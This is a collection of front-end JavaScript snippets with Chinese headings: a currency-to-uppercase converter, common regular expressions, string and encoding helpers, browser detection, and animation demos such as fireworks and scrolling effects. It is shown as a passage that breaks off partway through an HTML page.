function transform(tranvalue) {
  try {
	var i = 1;
	var dw2 = new Array("", "万", "亿"); //大单位
	var dw1 = new Array("拾", "佰", "仟"); //小单位
	var dw = new Array("零", "壹", "贰", "叁", "肆", "伍", "陆", "柒", "捌", "玖"); //整数部分用
	//以下是小写转换成大写显示在合计大写的文本框中	 
	//分离整数与小数
	var source = splits(tranvalue);
	var num = source[0];
	var dig = source[1];
	//转换整数部分
	var k1 = 0; //计小单位
	var k2 = 0; //计大单位
	var sum = 0;
	var str = "";
	var len = source[0].length; //整数的长度
	for (i = 1; i <= len; i++) {
	  var n = source[0].charAt(len - i); //取得某个位数上的数字
	  var bn = 0;
	  if (len - i - 1 >= 0) {
		bn = source[0].charAt(len - i - 1); //取得某个位数前一位上的数字
	  }
	  sum = sum + Number(n);
	  if (sum != 0) {
		str = dw[Number(n)].concat(str); //取得该数字对应的大写数字，并插入到str字符串的前面
		if (n == '0') sum = 0;
	  }
	  if (len - i - 1 >= 0) { //在数字范围内
		if (k1 != 3) { //加小单位
		  if (bn != 0) {
			str = dw1[k1].concat(str);
		  }
		  k1++;
		} else { //不加小单位，加大单位
		  k1 = 0;
		  var temp = str.charAt(0);
		  if (temp == "万" || temp == "亿") //若大单位前没有数字则舍去大单位
		  str = str.substr(1, str.length - 1);
		  str = dw2[k2].concat(str);
		  sum = 0;
		}
	  }
	  if (k1 == 3) //小单位到千则大单位进一
	  {
		k2++;
	  }
	}
	//转换小数部分
	var strdig = "";
	if (dig != "") {
	  var n = dig.charAt(0);
	  if (n != 0) {
		strdig += dw[Number(n)] + "角"; //加数字
	  }
	  var n = dig.charAt(1);
	  if (n != 0) {
		strdig += dw[Number(n)] + "分"; //加数字
	  }
	}
	str += "元" + strdig;
  } catch(e) {
	return "0元";
  }
  return str;
}
//拆分整数与小数
function splits(tranvalue) {
  var value = new Array('', '');
  temp = tranvalue.split(".");
  for (var i = 0; i < temp.length; i++) {
	value[i] = temp[i];
  }
  return value;
}
90、原生JavaScript常用的正则表达式大收集
匹配中文字符的正则表达式： [\u4e00-\u9fa5] 
匹配双字节字符（包括汉字在内）：[^\x00-\xff] 
匹配空行的正则表达式：\n[\s| ]*\r 
匹配 HTML 标记的正则表达式：<(.*)>.*<\/\1>|<(.*) \/>
匹配首尾空格的正则表达式：(^\s*)|(\s*$) 
匹配 IP 地址的正则表达式：/(\d+)\.(\d+)\.(\d+)\.(\d+)/g
匹配 Email 地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*
匹配网址 URL 的正则表达式：http://(/[\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?
sql 语句：^(select|drop|delete|create|update|insert).*$ 
非负整数：^\d+$ 
正整数：^[0-9]*[1-9][0-9]*$ 
非正整数：^((-\d+)|(0+))$ 
负整数：^-[0-9]*[1-9][0-9]*$ 
整数：^-?\d+$ 
非负浮点数：^\d+(\.\d+)?$ 
正浮点数：^((0-9)+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 
非正浮点数：^((-\d+\.\d+)?)|(0+(\.0+)?))$ 
英文字符串：^[A-Za-z]+$ 
英文大写串：^[A-Z]+$ 
英文小写串：^[a-z]+$ 
英文字符数字串：^[A-Za-z0-9]+$ 
英数字加下划线串：^\w+$ 
E-mail地址：^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$ 
URL：^[a-zA-Z]+://(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\s*)?$ 或：^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\':+!]*([^<>\"\"])*$ 
邮政编码：^[1-9]\d{5}$ 
电话号码：^((\(\d{2,3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}(\-\d{1,4})?$ 
手机号码：^((\(\d{2,3}\))|(\d{3}\-))?13\d{9}$ 
双字节字符（包括汉字在内）：^\x00-\xff 
匹配首尾空格：(^\s*)|(\s*$)
匹配 HTML 标记：<(.*)>.*<\/\1>|<(.*) \/> 
匹配空行：\n[\s| ]*\r 
提取信息中的网络链接：(h|H)(r|R)(e|E)(f|F) *= *('|")?(\w|\\|\/|\.)+('|"| *|>)? 
提取信息中的邮件地址：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* 
提取信息中的图片链接：(s|S)(r|R)(c|C) *= *('|")?(\w|\\|\/|\.)+('|"| *|>)? 
提取信息中的 IP 地址：(\d+)\.(\d+)\.(\d+)\.(\d+) 
提取信息中的中国手机号码：(86)*0*13\d{9} 
提取信息中的中国固定电话号码：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{8} 
提取信息中的中国电话号码（包括移动和固定电话）：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{7,14} 
提取信息中的中国邮政编码：[1-9]{1}(\d+){5} 
提取信息中的浮点数（即小数）：(-?\d*)\.?\d+ 
提取信息中的任何数字 ：(-?\d*)(\.\d+)? 
IP：(\d+)\.(\d+)\.(\d+)\.(\d+) 
电话区号：^0\d{2,3}$
腾讯 QQ 号：^[1-9]*[1-9][0-9]*$ 
帐号（字母开头，允许 5-16 字节，允许字母数字下划线）：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 
中文、英文、数字及下划线：^[\u4e00-\u9fa5_a-zA-Z0-9]+$
91、原生JavaScript实现窗体改变事件resize的操作（兼容所以的浏览器）
(function(){
	var fn = function(){
		var w = document.documentElement ? document.documentElement.clientWidth : document.body.clientWidth
			,r = 1255
			,b = Element.extend(document.body)
			,classname = b.className;
		if(w < r){
			//当窗体的宽度小于1255的时候执行相应的操作
		}else{
			//当窗体的宽度大于1255的时候执行相应的操作
		}
	}
	if(window.addEventListener){
		window.addEventListener('resize', function(){ fn(); });
	}else if(window.attachEvent){
		window.attachEvent('onresize', function(){ fn(); });
	}
	fn();
})();
92、原生JavaScript用正则清除空格分左右
function ltrim(s){ return s.replace( /^(\s*|　*)/, ""); } 
function rtrim(s){ return s.replace( /(\s*|　*)$/, ""); } 
function trim(s){ return ltrim(rtrim(s));} 
93、原生JavaScript判断变量是否空值
/**
 * 判断变量是否空值
 * undefined, null, '', false, 0, [], {} 均返回true，否则返回false
 */
function empty(v){
	switch (typeof v){
		case 'undefined' : return true;
		case 'string'	: if(trim(v).length == 0) return true; break;
		case 'boolean'   : if(!v) return true; break;
		case 'number'	: if(0 === v) return true; break;
		case 'object'	: 
			if(null === v) return true;
			if(undefined !== v.length && v.length==0) return true;
			for(var k in v){return false;} return true;
			break;
	}
	return false;
}

#T=JavaScript 100原生态纯大技巧大收集---你值得拥有(2)
94、原生JavaScript实现base64解码
function base64_decode(data){
	var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,ac = 0,dec = "",tmp_arr = [];
	if (!data) { return data; }
	data += '';
	do { 
		h1 = b64.indexOf(data.charAt(i++));
		h2 = b64.indexOf(data.charAt(i++));
		h3 = b64.indexOf(data.charAt(i++));
		h4 = b64.indexOf(data.charAt(i++));
		bits = h1 << 18 | h2 << 12 | h3 << 6 | h4;
		o1 = bits >> 16 & 0xff;
		o2 = bits >> 8 & 0xff;
		o3 = bits & 0xff;
		if (h3 == 64) {
			tmp_arr[ac++] = String.fromCharCode(o1);
		} else if (h4 == 64) {
			tmp_arr[ac++] = String.fromCharCode(o1, o2);
		} else {
			tmp_arr[ac++] = String.fromCharCode(o1, o2, o3);
		}
	} while (i < data.length);
	dec = tmp_arr.join('');
	dec = utf8_decode(dec);
	return dec;
}
95、原生JavaScript实现utf8解码
function utf8_decode(str_data){
	var tmp_arr = [],i = 0,ac = 0,c1 = 0,c2 = 0,c3 = 0;str_data += '';
	while (i < str_data.length) {
		c1 = str_data.charCodeAt(i);
		if (c1 < 128) {
			tmp_arr[ac++] = String.fromCharCode(c1);
			i++;
		} else if (c1 > 191 && c1 < 224) {	   
			c2 = str_data.charCodeAt(i + 1);
			tmp_arr[ac++] = String.fromCharCode(((c1 & 31) << 6) | (c2 & 63));
			i += 2;
		} else {
			c2 = str_data.charCodeAt(i + 1);
			c3 = str_data.charCodeAt(i + 2);
			tmp_arr[ac++] = String.fromCharCode(((c1 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
			i += 3;
		}
	} 
	return tmp_arr.join('');
}
96、原生JavaScript获取窗体可见范围的宽与高
function getViewSize(){
	var de=document.documentElement;
	var db=document.body;
	var viewW=de.clientWidth==0 ?  db.clientWidth : de.clientWidth;
	var viewH=de.clientHeight==0 ?  db.clientHeight : de.clientHeight;
	return Array(viewW ,viewH);
}
97、原生JavaScript判断IE版本号（既简洁、又向后兼容！）
var _IE = (function(){
	var v = 3, div = document.createElement('div'), all = div.getElementsByTagName('i');
	while (
		div.innerHTML = '<!--[if gt IE ' + (++v) + ']><i></i><![endif]-->',
		all[0]
	);
	return v > 4 ? v : false ;
}());
98、原生JavaScript获取浏览器版本号
function browserVersion(types) {
	var other = 1;
	for (i in types) {
		var v = types[i] ? types[i] : i;
		if (USERAGENT.indexOf(v) != -1) {
			var re = new RegExp(v + '(\\/|\\s|:)([\\d\\.]+)', 'ig');
			var matches = re.exec(USERAGENT);
			var ver = matches != null ? matches[2] : 0;
			other = ver !== 0 && v != 'mozilla' ? 0 : other;
		} else {
			var ver = 0;
		}
		eval('BROWSER.' + i + '= ver');
	}
	BROWSER.other = other;
}
99、原生JavaScript半角转换为全角函数
function ToDBC(str){
  var result = '';
  for(var i=0; i < str.length; i++){
	code = str.charCodeAt(i);
	if(code >= 33 && code <= 126){
	  result += String.fromCharCode(str.charCodeAt(i) + 65248);
	}else if (code == 32){
	  result += String.fromCharCode(str.charCodeAt(i) + 12288 - 32);
	}else{
	  result += str.charAt(i);
	}
  }
 return result;
}
100、原生JavaScript全角转换为半角函数 
function ToCDB(str){
  var result = '';
  for(var i=0; i < str.length; i++){
	code = str.charCodeAt(i);
	if(code >= 65281 && code <= 65374){
	  result += String.fromCharCode(str.charCodeAt(i) - 65248);
	}else if (code == 12288){
	  result += String.fromCharCode(str.charCodeAt(i) - 12288 + 32);
	}else{
	  result += str.charAt(i);
	}
  }
 return result;
}
#T=javascript inspect object
<script type="text/javascript">
<!--
	function inspect(obj, maxLevels, level)
	{
		var str = '', type, msg;
		// Start Input Validations
		// Don't touch, we start iterating at level zero
		if(level == null)
		{
			level = 0;
		}

		// At least you want to show the first level
		if (maxLevels == null)
		{
			maxLevels = 1;
		}
		if (maxLevels < 1)
		{
			return '<font color="red">Error: Levels number must be > 0</font>';
		}
		// We start with a non null object
		if (obj == null)
		{
			return '<font color="red">Error: Object <b>NULL</b></font>';
		}
		// End Input Validations

		// Each Iteration must be indented
		str += '<ul>';

		// Start iterations for all objects in obj
		for(property in obj)
		{
			try
			{
				// Show "property" and "type property"
				type =  typeof(obj[property]);
				str += '<li>(' + type + ') ' + property + 
					((obj[property]==null)?(': <b>null</b>'):('')) + '</li>';

				// We keep iterating if this property is an Object, non null
				// and we are inside the required number of levels
				if ((type == 'object') && (obj[property] != null) && (level+1 < maxLevels))
				{
					str += inspect(obj[property], maxLevels, level+1);
				}
			}
			catch (err)
			{
				// Is there some properties in obj we can't access? Print it red.
				if (typeof(err) == 'string')
				{
					msg = err;
				}
				else if (err.message)
				{
					msg = err.message;
				}
				else if (err.description)
				{
					msg = err.description;
				}
				else
				{
					msg = 'Unknown';
				}
				str += '<li><font color="red">(Error) ' + property + ': ' + msg +'</font></li>';
			}
		}

		// Close indent
		str += '</ul>';

		return str;
	}

//-->
</script>

#T=javascript 动态javascript script.text
<script type="text/javascript">
window.onload = function(){
var script = document.createElement('script');
script.type = 'text/javascript';
script.text = "alert('这是动态添加的！')";
document.body.appendChild(script);
#T=JavaScript 放炮仗
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
<script type="text/javascript" language="javascript">
var Utils={};
Utils.$E=function(id){
	return document.getElementById(id);
};
Utils.$C=function(tagName){
	return document.createElement(tagName);
};
Utils.getIntervalRandom=function(min,max){
	return parseInt(Math.random()*(max-min)+min);
};
Utils.INTERVAL_SPEED=30;
if(navigator.appName.toLowerCase().indexOf("netscape")!=-1)
{
	Utils.INTERVAL_SPEED=Utils.INTERVAL_SPEED+(Utils.INTERVAL_SPEED/6);
}
String.prototype.padLeft=function(sLen,padChar){
	var result=this;
	for(i=this.length;i<sLen;i++){
		result=padChar+result;
	}
	return result;
};
var Firework=function(x,shotHeight,radius,particleCount,color,speed){
	this.shotHeight=shotHeight || 200;
	this.radius=radius || 100;
	this.particleCount=particleCount || 10;
	this.color=color || "#FF0000";
	this.parentElement=document.body;
	this.x=x;
	this.shottingSpeed=speed || 3;
	this.isShoted=false;
	this.isFlash=true;
	
	this._particles=[];
	this._particleShape=unescape("%u25CF");
	this._shottingShape="|";
	this._depth=3;
	this._shotting=Utils.$C("div");
	this._flashing=Utils.$C("div");
	this._disposeCount=0;
	
	var _this=this;
	
	void function initialize(){
		for(var i=0;i<_this.particleCount;i++){
			_this._particles[i]=Utils.$C("div");
			_this._particles[i].style.position="absolute";
			_this._particles[i].style.left=_this.x+"px";
			_this._particles[i].style.top=_this.shotHeight+"px";
			_this._particles[i].style.zIndex=100;
			_this._particles[i].style.color=_this.color;
			_this._particles[i].style.display="none";
			_this._particles[i].innerHTML=_this._particleShape;
			_this._particles[i].distance=Utils.getIntervalRandom(1,_this.radius-parseInt((i%_this._depth)*(_this.radius/_this._depth)));
			_this._particles[i].speed=Utils.getIntervalRandom(1,4)*_this._particles[i].distance*0.06;
			_this.parentElement.appendChild(_this._particles[i]);
			_this._setSize(_this._particles[i],5);
		}
		
		_this._shotting.speed=_this.shottingSpeed;
		_this._shotting.innerHTML=_this._shottingShape;
		_this._shotting.style.position="absolute";
		_this._shotting.style.fontWeight="900";
		_this._shotting.style.left=_this.x+"px";
		//_this._shotting.style.top=_this.parentElement.offsetTop+_this.parentElement.offsetHeight-_this._shotting.offsetHeight+"px";
		_this._shotting.style.top="700px";
		_this._shotting.style.zIndex=100;
		_this._shotting.style.color=_this.color;
		_this._setSize(_this._shotting,15);
		_this.parentElement.appendChild(_this._shotting);
		
		_this._flashing.style.width="100%";
		_this._flashing.style.height="100%";
		_this._flashing.style.left="0";
		_this._flashing.style.top="0";
		_this._flashing.style.backgroundColor="#ffffee";
		_this._flashing.style.position="absolute";
		_this._flashing.style.zIndex=200;
		_this._flashing.style.display="none";
		_this._flashing.style.MozOpacity=0.5;
		_this._flashing.style.filter="alpha(opacity=50)";
		_this.parentElement.appendChild(_this._flashing);
		
	}();
};
Firework.prototype.shot=function(){
	var _this=this;
	_this.isShoted=true;
	var shotInterval=window.setInterval(function(){
		if(parseInt(_this._shotting.style.top)>_this.shotHeight){
			_this._shotting.style.top=parseInt(_this._shotting.style.top)-_this._shotting.speed+"px";
		}
		else{
			window.clearInterval(shotInterval);
			_this.parentElement.removeChild(_this._shotting);
			_this.bomb();
			_this._shotting=null;
		}	
	},Utils.INTERVAL_SPEED);
};
Firework.prototype.bomb=function(){
	var _this=this;
	if(_this.isFlash){
		_this._flashing.style.display="";
		var flashTimeout=window.setTimeout(function(){
			_this.parentElement.removeChild(_this._flashing);
			window.clearTimeout(flashTimeout);
		},10);
	}
	else{
		_this.parentElement.removeChild(_this._flashing);
	}
	
	for (var i = 0; i <_this._particles.length; i++) {
		_this._moveParticle(_this._particles[i], Utils.getIntervalRandom(0,360));
	}
};
Firework.prototype._setSize=function(obj,value){
	obj.style.fontSize=parseInt(value)+"px";
};
Firework.prototype._moveParticle=function(particle,angle){
	var _this=this;
	var initX=parseInt(particle.style.left);
	var initY=parseInt(particle.style.top);
	var currentDistance=0;
	var currentX=initX;
	var currentY=initY;
	particle.style.display="";
	
	particle.intervalId=window.setInterval(function(){
		if(currentDistance<particle.distance){
			var newX,newY;
			var xAngle=angle*(2*Math.PI/360);
			var xDirection=Math.abs(Math.cos(xAngle))/Math.cos(xAngle);
			var yDirection=Math.abs(Math.sin(xAngle))/Math.sin(xAngle);
	
			if(Math.abs(Math.tan(xAngle))<=1){
				var deltaX=Math.abs(particle.speed*Math.cos(xAngle))*xDirection;
				newX=currentX+deltaX;
				newY=-(newX-initX)*Math.tan(xAngle)+initY;
				currentDistance+=Math.abs(deltaX);
			}
			else{
				var deltaY=Math.abs(particle.speed*Math.sin(xAngle))*yDirection;
				newY=currentY-deltaY;
				newX=-(newY-initY)/Math.tan(xAngle)+initX;
				currentDistance+=Math.abs(deltaY);
			}
			currentX=newX;
			currentY=newY;
			particle.style.left=currentX+"px";
			particle.style.top=currentY+"px";
		}
		else{
			window.clearInterval(particle.intervalId);
			_this.parentElement.removeChild(particle);
			particle=null;
			if(++_this._disposeCount==_this.particleCount){
				_this._particles.length=0;
				_this.parentElement=null;
				_this=null;
			}
		}
	},Utils.INTERVAL_SPEED);
};
</script>
<script type="text/javascript">
			function test(){
				var fireworks=[];
				var total=15;
				window.setInterval(function(){
					for (var i = 0; i < total; i++) {
						if (!fireworks[i] || !fireworks[i].parentElement) {
							var x=Utils.getIntervalRandom(50,document.body.offsetWidth-50);
							var shotHeight=Utils.getIntervalRandom(100,450);
							var radius=Utils.getIntervalRandom(50,200);
							var particleCount=Utils.getIntervalRandom(40,80);
							var speed=Utils.getIntervalRandom(10,20);
							var color="#"+Utils.getIntervalRandom(0,16777215).toString(16).padLeft(6,"f");
							fireworks[i] = new Firework(x, shotHeight, radius, particleCount, color, speed);
						}
					}
				},100);
				
				window.setInterval(function(){
					var currentIndex=Utils.getIntervalRandom(0,total);
					if(fireworks[currentIndex] && fireworks[currentIndex].parentElement && !fireworks[currentIndex].isShoted){
						fireworks[currentIndex].shot();
					}
				},500);
			}
		</script>
 </head>
 <body>
 <body bgColor="#000000" onload="test();">
		<div style="width:100%;text-align:center;font:100px 'Comic Sans MS',Arial,sans-serif;color:yellow;">Happy New Year</div>
		<div style="width:100%;text-align:center;font:100px 'Comic Sans MS',Arial,sans-serif;color:red;">2009</div>
		<a href="http://random.cnblogs.com" target="newWindow"><div style="width:100%;font-size:12px;text-align:center;color:#fff">Copyright by Random 2009 All Rights Reserved</div></a>
	</body>
  
 </body>
</html>

#T=Javascript 图片滑动展示效果
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>无标题文档</title>
<script type="text/javascript">
var $ = function (id) {
    return "string" == typeof id ? document.getElementById(id) : id;
};

function Event(e){
	var oEvent = document.all ? window.event : e;
	if (document.all) {
		if(oEvent.type == "mouseout") {
			oEvent.relatedTarget = oEvent.toElement;
		}else if(oEvent.type == "mouseover") {
			oEvent.relatedTarget = oEvent.fromElement;
		}
	}
	return oEvent;
}

function addEventHandler(oTarget, sEventType, fnHandler) {
	if (oTarget.addEventListener) {
		oTarget.addEventListener(sEventType, fnHandler, false);
	} else if (oTarget.attachEvent) {
		oTarget.attachEvent("on" + sEventType, fnHandler);
	} else {
		oTarget["on" + sEventType] = fnHandler;
	}
};

var Class = {
  create: function() {
    return function() {
      this.initialize.apply(this, arguments);
    }
  }
}

Object.extend = function(destination, source) {
    for (var property in source) {
        destination[property] = source[property];
    }
    return destination;
}


var GlideView = Class.create();
GlideView.prototype = {
  //容器对象 容器宽度 展示标签 展示宽度
  initialize: function(obj, iWidth, sTag, iMaxWidth, options) {
    var oContainer = $(obj), oThis=this, len = 0;
	
	this.SetOptions(options);
	this.Step = Math.abs(this.options.Step);
	this.Time = Math.abs(this.options.Time);
	this.Showtext = false;
	
	this._list = oContainer.getElementsByTagName(sTag);
	len = this._list.length;
	this._count = len;
	this._width = parseInt(iWidth / len);
	this._width_max = parseInt(iMaxWidth);
	this._width_min = parseInt((iWidth - this._width_max) / (len - 1));
	this._timer = null;
	
	if(this.options.TextTag && this.options.TextHeight > 0){
		this.Showtext = true;
		this._text = oContainer.getElementsByTagName(this.options.TextTag);
		this._height_text = -parseInt(this.options.TextHeight);
	}
	
	this.Each(function(oList, oText, i){
		oList._target = this._width * i;//自定义一个属性放目标left
		oList.style.left = oList._target + "px";
		oList.style.position = "absolute";
		addEventHandler(oList, "mouseover", function(){ oThis.Set.call(oThis, i); });
		
		if(oText){
			oText._target = this._height_text;//自定义一个属性放目标bottom
			oText.style.bottom = oText._target + "px";
			oText.style.position = "absolute";
		}
	})
	
	oContainer.style.width = iWidth + "px";
	oContainer.style.overflow = "hidden";
	oContainer.style.position = "relative";
	addEventHandler(oContainer, "mouseout", function(e){
		//变通防止执行oList的mouseout
		var oOut = Event(e).relatedTarget;
		while(oOut.parentNode){ oOut = oOut.parentNode; if(oOut == oContainer) return; }
		oThis.Set.call(oThis, -1);
	})
  },
  //设置默认属性
  SetOptions: function(options) {
    this.options = {//默认值
		Step:			20,//滑动变化率
		Time:			20,//滑动延时
		TextTag:		"",//说明容器tag
		TextHeight:		0//说明容器高度
    };
    Object.extend(this.options, options || {});
  },
  //
  Set: function(index) {
	if (index < 0) {
		this.Each(function(oList, oText, i){ oList._target = this._width * i; if(oText){ oText._target = this._height_text; } })
	} else {
		this.Each(function(oList, oText, i){
			oList._target = (i <= index) ? this._width_min * i : this._width_min * (i - 1) + this._width_max;
			if(oText){ oText._target = (i == index) ? 0 : this._height_text; }
		})
	}
	this.Move();
  },
  //
  Move: function() {
	clearTimeout(this._timer);
	var bFinish = true;
	this.Each(function(oList, oText, i){
		var nowLeft = parseInt(oList.style.left), iLeftStep = this.GetStep(oList._target, nowLeft);
		if (iLeftStep != 0) { bFinish = false; oList.style.left = (nowLeft + iLeftStep) + "px"; }
		if (oText) {
			var nowBottom = parseInt(oText.style.bottom), iBottomStep = this.GetStep(oText._target, nowBottom);
			if (iBottomStep != 0) { bFinish = false; oText.style.bottom = (nowBottom + iBottomStep) + "px"; }
		}
	})
	if (!bFinish) { var oThis = this; this._timer = setTimeout(function(){ oThis.Move(); }, this.Time); }
  },
  //
  GetStep: function(iTarget, iNow) {
	var iStep = (iTarget - iNow) / this.Step;
	if (iStep == 0) return 0;
	if (Math.abs(iStep) < 1) return (iStep > 0 ? 1 : -1);
	return iStep;
  },
  Each:function(fun) {
	for (var i = 0; i < this._count; i++)
		fun.call(this, this._list[i], (this.Showtext ? this._text[i] : null), i);
  }
};

window.onload=function(){
	new GlideView("idGlideView", 1000, "div", 500, { TextTag: "a", TextHeight: 50 });
}
</script>
<style type="text/css">
^#idGlideView{height:100px;margin:100px auto;}
^#idGlideView div{width:500px;height:100px;}
^#idGlideView div a{width:500px;height:50px;filter: alpha(opacity=50);opacity: 0.5; background:#000; color:#fff; text-decoration:none;}
</style>
</head>
<body>
<div id="idGlideView">
  <div style="background-color:#006699;"> <a href="/">1111111</a> </div>
  <div style="background-color:#FF9933;"> <a href="/">2222222</a> </div>
  <div style="background-color:#9999FF;"> <a href="/">3333333</a> </div>
  <div style="background-color:#006699;"> <a href="/">1111111</a> </div>
  <div style="background-color:#FF9933;"> <a href="/">2222222</a> </div>
  <div style="background-color:#9999FF;"> <a href="/">3333333</a> </div>
</div>
</body>
</html>

#T=JavaScript 无缝上下左右滚动加定高定宽停顿效果(兼容ie/ff)
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>JavaScript 无缝上下左右滚动加定高定宽停顿效果(兼容ie/ff)</title>
</head>
<body>
<script type="text/javascript">
var $ = function (id) {
    return "string" == typeof id ? document.getElementById(id) : id;
};

var Class = {
  create: function() {
    return function() {
      this.initialize.apply(this, arguments);
    }
  }
}

Object.extend = function(destination, source) {
	for (var property in source) {
		destination[property] = source[property];
	}
	return destination;
}

function addEventHandler(oTarget, sEventType, fnHandler) {
	if (oTarget.addEventListener) {
		oTarget.addEventListener(sEventType, fnHandler, false);
	} else if (oTarget.attachEvent) {
		oTarget.attachEvent("on" + sEventType, fnHandler);
	} else {
		oTarget["on" + sEventType] = fnHandler;
	}
};


var Scroller = Class.create();
Scroller.prototype = {
  initialize: function(idScroller, idScrollMid, options) {
    var oThis = this, oScroller = $(idScroller), oScrollMid = $(idScrollMid);
	
	this.SetOptions(options);
	this.Side = this.options.Side || ["up"];//方向
	this.scroller = oScroller;			//对象
	this.speed = this.options.Speed;	//速度
	this.timer = null;					//时间
	this.pauseHeight = 0;				//定高
	this.pauseWidth = 0;				//定宽
	this.pause = 0;						//定高(宽)
	this.side = 0;						//参数
	
	//用于上下滚动
	this.heightScroller = parseInt(oScroller.style.height) || oScroller.offsetHeight;
	this.heightList = oScrollMid.offsetHeight;
	
	//用于左右滚动
	this.widthScroller = parseInt(oScroller.style.width) || oScroller.offsetWidth;
	this.widthList = oScrollMid.offsetWidth;
	
	//js取不到css设置的height和width
	
	oScroller.style.overflow = "hidden";
	oScrollMid.appendChild(oScrollMid.cloneNode(true));
	oScrollMid.appendChild(oScrollMid.cloneNode(true));
	
	addEventHandler(oScroller, "mouseover", function() { oThis.Stop(); });
	addEventHandler(oScroller, "mouseout", function() { oThis.Start(); });
	
	this.Start();
  },
  //设置默认属性
  SetOptions: function(options) {
    this.options = {//默认值
	  Step:			1,//每次变化的px量
	  Speed:		20,//速度(越大越慢)
	  Side:			["up"],//滚动方向:"up"是上，"down"是下，"left"是左，"right"是右
	  PauseHeight:	0,//隔多高停一次
	  PauseWidth:	0,//隔多宽停一次
	  //当上下和左右一起使用时必须设置PauseHeight和PauseWidth来设置转向位置
	  PauseStep:	1000//停顿时间(PauseHeight或PauseWidth大于0该参数才有效)
    };
    Object.extend(this.options, options || {});
  }, 
  //转向
  Turn: function() {
	//通过设置方向数组的排列来转向
	this.Side.push(this.Side.shift().toLowerCase());
  },
  //上下滚动
  ScrollUpDown: function() {
	this.pause = this.pauseHeight;
	this.scroller.scrollTop = this.GetScroll(this.scroller.scrollTop, this.heightScroller, this.heightList, this.options.PauseHeight);
	this.pauseHeight = this.pause;
	
	var oThis = this;
	this.timer = window.setTimeout(function(){ oThis.Start(); }, this.speed);
  },
  //左右滚动
  ScrollLeftRight: function() {
	this.pause = this.pauseWidth;
	//注意:scrollLeft超过1400会自动变回1400 注意长度
	this.scroller.scrollLeft = this.GetScroll(this.scroller.scrollLeft, this.widthScroller, this.widthList, this.options.PauseWidth);
	this.pauseWidth = this.pause;
	
	var oThis = this;
	this.timer = window.setTimeout(function(){ oThis.Start(); }, this.speed);
  },
  //获取设置滚动数据
  GetScroll: function(iScroll, iScroller, iList, iPause) {
	var iStep = this.options.Step * this.side;
	
	if(this.side > 0){
		if(iScroll >= (iList * 2 - iScroller)){ iScroll -= iList; }
	} else {
		if(iScroll <= 0){ iScroll += iList; }
	}
	
	this.speed = this.options.Speed;
	if(iPause > 0){
		if(Math.abs(this.pause) >= iPause){
			this.speed = this.options.PauseStep; this.pause = iStep = 0; this.Turn();
		} else {
			this.pause += iStep;
		}
	}
	
	return (iScroll + iStep);
  },
  //开始
  Start: function() {
	
	//document.getElementById("test").innerHTML+=sTurn+",";
	
	//方向设置
	switch (this.Side[0].toLowerCase()) {
		case "right" :
			if(this.widthList < this.widthScroller) return;
			this.side = -1;
			this.ScrollLeftRight();
			break;
		case "left" :
			if(this.widthList < this.widthScroller) return;
			this.side = 1;
			this.ScrollLeftRight();
			break;
		case "down" :
			if(this.heightList < this.heightScroller) return;
			this.side = -1;
			this.ScrollUpDown();
			break;
		case "up" :
		default :
			if(this.heightList < this.heightScroller) return;
			this.side = 1;
			this.ScrollUpDown();
	}
  },
  //停止
  Stop: function() {
	clearTimeout(this.timer);
  }
};

window.onload = function(){
	new Scroller("idScroller", "idScrollMid",{ Side:["up","left","down","right"], PauseHeight:50, PauseWidth:250 });
	new Scroller("idScroller1", "idScrollMid1",{ Side:["up","left"], PauseHeight:50, PauseWidth:250 });
	
	new Scroller("idScroller2", "idScrollMid2",{ Side:["up","left","down"], PauseHeight:100, PauseWidth:100, PauseStep:0 });
	new Scroller("idScroller3", "idScrollMid3",{ Side:["up","up","up"], PauseHeight:100, PauseWidth:100, PauseStep:0 });
	new Scroller("idScroller4", "idScrollMid4",{ Side:["up","down","down"], PauseHeight:100, PauseWidth:100, PauseStep:0 });
	new Scroller("idScroller5", "idScrollMid5",{ Side:["up","right","up"], PauseHeight:100, PauseWidth:100, PauseStep:0 });
}
</script>
<style>
*{margin:0px; padding:0px;}
.Scroller {line-height:50px;overflow:hidden; border:1px solid #000000;}

.ScrollMid {float:left;}
.ScrollMid ul{width:250px;float:left;overflow:hidden;}
.ScrollMid li{list-style:none;}

.Scroller2 {overflow:hidden;float:left;}
.ScrollMid2 {float:left;}
.ScrollMid2 ul{width:100px;height:100px;float:left;overflow:hidden;}
.ScrollMid2 li{list-style:none; width:50px; height:50px; background:#000; border:25px solid #FFF; color:#FFFFFF; line-height:25px; text-align:center; font-size:24px;}
</style>
<div id="idScroller" class="Scroller" style="width:250px; height:50px;">
  <div style="width:500px">
    <div id="idScrollMid" class="ScrollMid">
      <ul>
        <li> <a href="http://shundebk.cn/">1111111111111111111111</a></li>
